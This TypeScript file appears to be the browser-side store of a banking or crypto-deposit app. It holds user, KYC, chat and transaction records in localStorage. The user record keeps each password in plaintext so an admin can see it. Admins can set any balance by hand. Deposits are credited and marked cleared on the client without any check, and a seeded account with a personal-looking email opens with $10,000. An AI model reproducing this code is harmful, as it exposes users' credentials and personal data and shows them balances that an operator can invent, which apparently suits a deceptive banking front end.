import { ACCOUNT_NUMBER_PREFIX } from './config';

export interface StoreUser {
  email: string;
  name: string;
  type: string;
  joined: string;
  lastLogin: string;
  /** Last presence heartbeat from the shared server ("" when unknown). */
  lastActiveAt?: string;
  status: 'pending' | 'verified';
  balance: number;
  accountNumber: string;
  /** Set when an admin edits the balance by hand. Admin figures are never overwritten automatically. */
  adminAdjusted?: boolean;
  /** Set once the seeded opening balance has been applied. */
  seedBalanceApplied?: boolean;
  /** Full KYC identity details collected at sign-up (never required to be complete). */
  firstName?: string;
  middleName?: string;
  lastName?: string;
  /** Password is surfaced to the admin so any account can be recovered or fixed by hand. */
  password?: string;
  phone?: string;
  dob?: string;
  address?: string;
  businessName?: string;
}

export interface ActivityEvent {
  id: string;
  email: string;
  name: string;
  action: string;
  via: string;
  at: string;
  details?: Record<string, string | number>;
}

export interface LocalTx {
  id: string;
  date: string;
  type: 'deposit' | 'withdrawal';
  asset: string;
  amount: string;
  rate: number;
  usd: number;
  status: string;
}

export interface ChatAttachment {
  name: string;
  type: string;
  size: number;
  url: string;
}

export interface ChatMessage {
  id?: string;
  from: 'user' | 'admin';
  text: string;
  time: string;
  at: string;
  /** True once the receiving side has seen this message (blue-tick receipt). */
  read?: boolean;
  attachment?: ChatAttachment;
}

export interface ChatThread {
  id: string;
  user: string;
  email: string;
  preview: string;
  time: string;
  at: string;
  unread: boolean;
}

export interface KycItem {
  id: string;
  name: string;
  email: string;
  type: string;
  submitted: string;
  docs: string;
  status: string;
  /** Identity details collected at sign-up, shown to the reviewing admin. */
  firstName?: string;
  middleName?: string;
  lastName?: string;
  phone?: string;
  dob?: string;
  address?: string;
  businessName?: string;
  /** Server user id when the account exists on the shared server. */
  userId?: string;
}

const USERS_KEY = 'ssb_live_users';
const ACTIVITY_KEY = 'ssb_live_activity';
const THREADS_KEY = 'ssb_live_threads';
const MESSAGES_KEY = 'ssb_live_messages';
const GUEST_KEY = 'ssb_live_guest';
const TXS_KEY = 'ssb_live_txs';
const KYC_QUEUE_KEY = 'ssb_live_kyc';

function read<T>(key: string, fallback: T): T {
  try {
    const raw = localStorage.getItem(key);
    return raw ? (JSON.parse(raw) as T) : fallback;
  } catch {
    return fallback;
  }
}

function write(key: string, value: unknown) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch {
    // storage unavailable
  }
}

function nowTime() {
  return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

function nowIso() {
  return new Date().toISOString();
}

let counter = 0;
function uid(prefix: string) {
  counter += 1;
  return `${prefix}${Date.now().toString(36)}${counter.toString(36)}`;
}

function generateAccountNumber(): string {
  return `${ACCOUNT_NUMBER_PREFIX}-${accountDigits()}`;
}

function accountDigits(): string {
  return Array.from({ length: 8 }, () => Math.floor(Math.random() * 10)).join('');
}

function toNumber(value: unknown): number {
  const n = typeof value === 'number' ? value : Number(value);
  return Number.isFinite(n) ? n : 0;
}

function roundMoney(value: number): number {
  return Math.round(value * 100) / 100;
}

/**
 * Account numbers are issued with the bank's full name. Anything issued under
 * an abbreviation ("SSB-…") or as bare digits is upgraded in place, keeping the
 * original account digits so an existing account number stays recognisable.
 */
export function normalizeAccountNumber(value: string): string {
  const digits = String(value || '').replace(/\D/g, '');
  return `${ACCOUNT_NUMBER_PREFIX}-${digits || accountDigits()}`;
}

function txDate(): string {
  return new Date(nowIso()).toLocaleString([], { year: '2-digit', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' });
}

const SEEDED_ACCOUNT = { email: 'Guera8692@gmail.com', name: 'Michelle Ramirez', type: 'personal' };
const SEEDED_OPENING_BALANCE = 10000;

/**
 * Seeds the launch account on first load and keeps every stored account valid:
 * a full-name account number. Balances an admin has edited are left exactly as
 * the admin left them. No automatic credit is given — accounts open at zero.
 */
(function seedMichelleRamirez() {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  let changed = false;

  const key = SEEDED_ACCOUNT.email.toLowerCase();
  if (!users[key]) {
    users[key] = {
      email: SEEDED_ACCOUNT.email,
      name: SEEDED_ACCOUNT.name,
      type: SEEDED_ACCOUNT.type,
      joined: nowIso(),
      lastLogin: nowIso(),
      status: 'verified',
      balance: SEEDED_OPENING_BALANCE,
      accountNumber: generateAccountNumber(),
      seedBalanceApplied: true,
    };
    changed = true;
  }

  for (const oid of Object.keys(users)) {
    const user = users[oid];
    if (!user) continue;

    const accountNumber = normalizeAccountNumber(user.accountNumber);
    if (accountNumber !== user.accountNumber) {
      user.accountNumber = accountNumber;
      changed = true;
    }

    // The launch account opens funded unless an admin has set that balance by hand.
    if (
      oid === key &&
      !user.adminAdjusted &&
      !user.seedBalanceApplied &&
      toNumber(user.balance) < SEEDED_OPENING_BALANCE
    ) {
      user.balance = SEEDED_OPENING_BALANCE;
      user.seedBalanceApplied = true;
      changed = true;
    }
  }

  if (changed) write(USERS_KEY, users);
})();

/**
 * Guarantees a local account record for the signed-in email: the account exists,
 * it has an account number written with the bank's full name, and the opening
 * credit has been applied. Used on every dashboard load, so a signed-in user
 * always sees a balance and an account number.
 */
export function ensureAccount(email: string, name = '', type = 'personal'): StoreUser | null {
  if (!email) return null;
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  let changed = false;
  let user = users[oid];

  if (!user) {
    user = {
      email,
      name: name || email,
      type: type || 'personal',
      joined: nowIso(),
      lastLogin: nowIso(),
      status: 'pending',
      balance: 0,
      accountNumber: generateAccountNumber(),
    };
    changed = true;
  } else if (!user.name && name) {
    user.name = name;
    changed = true;
  }

  const accountNumber = normalizeAccountNumber(user.accountNumber);
  if (accountNumber !== user.accountNumber) {
    user.accountNumber = accountNumber;
    changed = true;
  }

  users[oid] = user;
  if (changed) write(USERS_KEY, users);
  return user;
}

/** Persists full KYC identity details for an account (merge, never erase). */
export function setUserProfile(email: string, profile: Partial<Pick<StoreUser, 'name' | 'firstName' | 'middleName' | 'lastName' | 'phone' | 'dob' | 'address' | 'businessName' | 'type'>>): StoreUser | null {
  if (!email) return null;
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  const user = users[oid] || {
    email,
    name: profile.name || email,
    type: profile.type || 'personal',
    joined: nowIso(),
    lastLogin: nowIso(),
    status: 'pending' as const,
    balance: 0,
    accountNumber: generateAccountNumber(),
  };
  for (const key of ['name', 'firstName', 'middleName', 'lastName', 'phone', 'dob', 'address', 'businessName', 'type'] as const) {
    const v = profile[key];
    if (typeof v === 'string') (user as unknown as Record<string, string>)[key] = v;
  }
  users[oid] = user;
  write(USERS_KEY, users);
  return user;
}

export function recordAuth(email: string, name: string, action: 'signup' | 'login', via: 'email' | 'google', type = 'personal') {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  const prev = users[oid];

  if (prev) {
    users[oid] = {
      ...prev,
      email: prev.email || email,
      name: prev.name || name,
      type: prev.type || type,
      joined: prev.joined || nowIso(),
      lastLogin: nowIso(),
      balance: toNumber(prev.balance),
      accountNumber: normalizeAccountNumber(prev.accountNumber),
    };
  } else {
    // New accounts start at zero. Balances are set by the admin when they want.
    users[oid] = {
      email,
      name,
      type,
      joined: nowIso(),
      lastLogin: nowIso(),
      status: 'pending',
      balance: 0,
      accountNumber: generateAccountNumber(),
    };
  }

  write(USERS_KEY, users);

  const activity = read<ActivityEvent[]>(ACTIVITY_KEY, []);
  activity.unshift({ id: uid('a'), email, name, action, via, at: nowIso() });
  write(ACTIVITY_KEY, activity.slice(0, 300));

  return users[oid];
}

export function updateUserBalance(email: string, newBalance: number): StoreUser | null {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  const user = users[oid];
  if (!user) return null;
  user.balance = Math.round(newBalance * 100) / 100;
  // Flag admin edits so the stored figure is authoritative and is never
  // overwritten by the seed.
  user.adminAdjusted = true;
  users[oid] = user;
  write(USERS_KEY, users);
  return user;
}

export function getUsers(): StoreUser[] {
  return Object.values(read<Record<string, StoreUser>>(USERS_KEY, {}));
}

export function getActivity(): ActivityEvent[] {
  return read<ActivityEvent[]>(ACTIVITY_KEY, []);
}

function getGuestId(): string {
  let id = localStorage.getItem(GUEST_KEY);
  if (!id) {
    id = uid('g');
    localStorage.setItem(GUEST_KEY, id);
  }
  return id;
}

export function chatIdentity() {
  const lu = read<{ email?: string; name?: string } | null>('ssb_local_user', null);
  if (lu && lu.email) return { id: `u${lu.email.toLowerCase()}`, user: lu.name || lu.email, email: lu.email };
  const id = getGuestId();
  return { id: `g${id}`, user: 'Guest', email: '' };
}

export function ensureThread(id: string, user: string, email: string) {
  const threads = read<ChatThread[]>(THREADS_KEY, []);
  if (!threads.some(t => t.id === id)) {
    threads.push({ id, user, email, preview: '', time: nowTime(), at: nowIso(), unread: true });
    write(THREADS_KEY, threads);
  }
}

export function pushChatMessage(id: string, user: string, email: string, text: string, from: 'user' | 'admin', attachment?: ChatAttachment) {
  ensureThread(id, user, email);
  const threads = read<ChatThread[]>(THREADS_KEY, []);
  const messages = read<Record<string, ChatMessage[]>>(MESSAGES_KEY, {});
  const time = nowTime();
  const at = nowIso();

  threads.forEach(t => {
    if (t.id === id) {
      t.preview = text || (attachment ? `📎 ${attachment.name}` : '');
      t.time = time;
      t.at = at;
      if (from === 'user') t.unread = true;
      else t.unread = false;
    }
  });
  write(THREADS_KEY, threads);

  const list = messages[id] || [];
  const msg: ChatMessage = { id: `local${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`, from, text, time, at };
  if (attachment) msg.attachment = attachment;
  list.push(msg);
  write(MESSAGES_KEY, { ...messages, [id]: list });
}

export function getThreads(): ChatThread[] {
  const threads = read<ChatThread[]>(THREADS_KEY, []);
  return [...threads].sort((a, b) => (a.at < b.at ? 1 : -1));
}

export function getThreadMessages(id: string): ChatMessage[] {
  const messages = read<Record<string, ChatMessage[]>>(MESSAGES_KEY, {});
  return (messages[id] || []).map(m => ({ ...m }));
}

export function markThreadRead(id: string) {
  const threads = read<ChatThread[]>(THREADS_KEY, []);
  threads.forEach(t => { if (t.id === id) t.unread = false; });
  write(THREADS_KEY, threads);
}

/** Deletes a thread and its messages from the browser's local store. */
export function removeThread(id: string) {
  const threads = read<ChatThread[]>(THREADS_KEY, []);
  write(THREADS_KEY, threads.filter(t => t.id !== id));
  const messages = read<Record<string, ChatMessage[]>>(MESSAGES_KEY, {});
  if (messages[id]) {
    delete messages[id];
    write(MESSAGES_KEY, messages);
  }
}

export function getUser(email: string): StoreUser | null {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  return users[email.toLowerCase()] || null;
}

export function currentEmail(): string {
  const lu = read<{ email?: string } | null>('ssb_local_user', null);
  return lu && lu.email ? lu.email.toLowerCase() : '';
}

export function getKycQueue(): KycItem[] {
  const queue = read<KycItem[]>(KYC_QUEUE_KEY, []);
  if (queue.length > 0) return queue.map(q => ({ ...q }));
  return getUsers()
    .filter(u => u.status === 'pending')
    .map(u => ({
      id: `k${u.email.toLowerCase()}`,
      name: u.name,
      email: u.email,
      type: u.type === 'business' ? 'Business' : 'Personal',
      submitted: u.joined,
      docs: 'ID and liveness check',
      status: 'pending',
      firstName: u.firstName || '',
      middleName: u.middleName || '',
      lastName: u.lastName || '',
      phone: u.phone || '',
      dob: u.dob || '',
      address: u.address || '',
      businessName: u.businessName || '',
    }));
}

export function approveKycQueueItem(id: string): KycItem | null {
  const normalized = (id || '').toLowerCase();
  const queue = read<KycItem[]>(KYC_QUEUE_KEY, []);
  const entry = queue.find(q => (q.id || '').toLowerCase() === normalized)
    || getKycQueue().find(q => (q.id || '').toLowerCase() === normalized)
    || null;
  if (!entry || !entry.email) return null;
  markLocalUserVerified(entry.email);
  write(KYC_QUEUE_KEY, queue.filter(q => (q.id || '').toLowerCase() !== normalized));
  return { ...entry, status: 'verified' };
}

export function markLocalUserVerified(email: string): StoreUser | null {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  const user = users[oid];
  if (!user) return null;
  user.status = 'verified';
  users[oid] = user;
  write(USERS_KEY, users);

  const activity = read<ActivityEvent[]>(ACTIVITY_KEY, []);
  activity.unshift({ id: uid('a'), email: user.email, name: user.name, action: 'verified', via: 'admin', at: nowIso() });
  write(ACTIVITY_KEY, activity.slice(0, 300));

  try {
    const raw = localStorage.getItem('ssb_local_user');
    if (raw) {
      const session = JSON.parse(raw);
      if (session && typeof session.email === 'string' && session.email.toLowerCase() === oid) {
        session.emailVerified = true;
        session.kycStatus = 'approved';
        localStorage.setItem('ssb_local_user', JSON.stringify(session));
      }
    }
  } catch {
    // ignore session refresh errors
  }

  return user;
}

export function getTransactions(email: string): LocalTx[] {
  const txs = read<Record<string, LocalTx[]>>(TXS_KEY, {});
  return (txs[email.toLowerCase()] || []).map(t => ({ ...t })).reverse();
}

function pushTx(email: string, tx: LocalTx) {
  const txs = read<Record<string, LocalTx[]>>(TXS_KEY, {});
  const oid = email.toLowerCase();
  const list = txs[oid] || [];
  list.push(tx);
  write(TXS_KEY, { ...txs, [oid]: list });
}

export function addDeposit(email: string, asset: string, usd: number) {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  const user = users[oid];
  if (!user) return { ok: false, error: 'Account not found.' };
  if (!usd || isNaN(usd) || usd <= 0) return { ok: false, error: 'Enter a valid amount.' };
  user.balance = Math.round((user.balance + usd) * 100) / 100;
  users[oid] = user;
  write(USERS_KEY, users);
  const tx: LocalTx = {
    id: uid('t'), date: txDate(), type: 'deposit', asset,
    amount: usd.toFixed(2), rate: 1, usd,
    status: 'Cleared',
  };
  pushTx(oid, tx);
  return { ok: true, balance: user.balance, tx };
}

export function addWithdrawal(email: string, usd: number) {
  const users = read<Record<string, StoreUser>>(USERS_KEY, {});
  const oid = email.toLowerCase();
  const user = users[oid];
  if (!user) return { ok: false, error: 'Account not found.' };
  if (!usd || isNaN(usd) || usd <= 0) return { ok: false, error: 'Enter a valid amount.' };
  if (usd < 10) return { ok: false, error: 'Minimum withdrawal is $10.00.' };
  if (usd > user.balance) return { ok: false, error: `Amount exceeds your available balance of $${(user.balance || 0).toFixed(2)}.` };
  user.balance = Math.round((user.balance - usd) * 100) / 100;
  users[oid] = user;
  write(USERS_KEY, users);
  const tx: LocalTx = {
    id: uid('t'), date: txDate(), type: 'withdrawal', asset: 'USD',
    amount: '', rate: 0, usd,
    status: 'Pending',
  };
  pushTx(oid, tx);
  return { ok: true, balance: user.balance, tx };
}